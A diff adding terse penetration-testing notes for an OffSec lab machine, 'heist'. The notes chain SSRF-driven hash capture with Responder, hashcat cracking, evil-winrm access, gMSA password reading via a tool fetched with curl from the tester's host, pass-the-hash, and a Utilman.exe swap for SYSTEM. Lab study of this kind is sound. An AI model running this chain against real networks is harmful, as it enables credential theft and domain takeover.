@@ -1,0 +1,136 @@
+heist
+
+	
+ 192.168.130.165
+
+
+
+
+
+
+sudo nmap -Pn -n 192.168.130.187 -sC -sV -p- --open 192.168.130.165
+Domain name heist.offsec
+nikto -h http://192.168.130.165:8080/
+Werkzeug/2.0.1 Python/3.9.0
+dirb http://192.168.130.165:8080/
+No luck
+
+
+http://192.168.130.165:8080/
+http://192.168.130.165:8080/?url=http://192.168.45.152:8000
+
+SSRF vulnuerability 
+
+sudo responder -I tun0 -wv
+http://192.168.130.165:8080/?url=http://192.168.45.152 
+Got Hashes
+
+hashcat --status -w 4 -a 0 enox::HEIST:8bc2e1abee91f882:8BCCF34403E5761BF34F5FDD4A8840AB:01010000000000001DA2A2F73313DB0176D02EE2EBF4393900000000020008004B0045005700510001001E00570049004E002D004C00480041003100480044004A004200380044005400040014004B004500570051002E004C004F00430041004C0003003400570049004E002D004C00480041003100480044004A0042003800440054002E004B004500570051002E004C004F00430041004C00050014004B004500570051002E004C004F00430041004C000800300030000000000000000000000000300000E76903FAA620CA02A3BA99301233906A7CA998BF4EA2CA4A0156643093D35E6D0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100350032000000000000000000 /usr/share/wordlists/rockyou.txt -m 5600
+
+Got password for user enox:california
+
+crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x “whoami”
+evil-winrm -i 192.168.123.165 -u enox -p california”
+
+got evil powershell
+
+whoami /priv
+
+C:\Users\enox\Desktop>
+lcoal.txt (first flag)
+check todo
+
+net user enox
+
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Web Admins           *Domain Users
+
+bloodhound-python -u enox -p california -ns 192.168.130.165 -d heist.offsec -c all
+neo4j
+bloodhound
+uload all files 
+Analysis >
+
+gMSA enabled for password manage 
+It can read passwords
+Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
+
+SamAccountName    : svc_apache$
+
+Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
+
+Get-ADGroupMember 'Web Admins'
+
+https://github.com/expl0itabl3/Toolies
+download GMSAPasswordReader.exe
+
+cp ~/Downloads/GMSAPasswordReader.exe ./gpr.exe
+
+curl http://192.168.45.152:8000/gpr.exe -O gpr.exe
+.\gpr.exe --accountname 'svc_apache'
+
+Got hash value
+
+  rc4_hmac             : 31424E5B49C147E64854B47E50AA4C98
+ 
+ evil-winrm -i 192.168.130.165 -u svc_apache$ -H 31424E5B49C147E64854B47E50AA4C98
+ 
+got new shell 
+ whoami /priv
+ 
+ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
+ 
+See SeRestore and its methods
+
+ren Utilman.exe Utilman.old
+ren cmd.exe Utilman.exe
+
+rdesktop 192.168.130.165
+then access cmd
+click on utilman icon
+
+cmd as administrator 
+
+rdesktop 192.168.130.165
+a0f4d
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
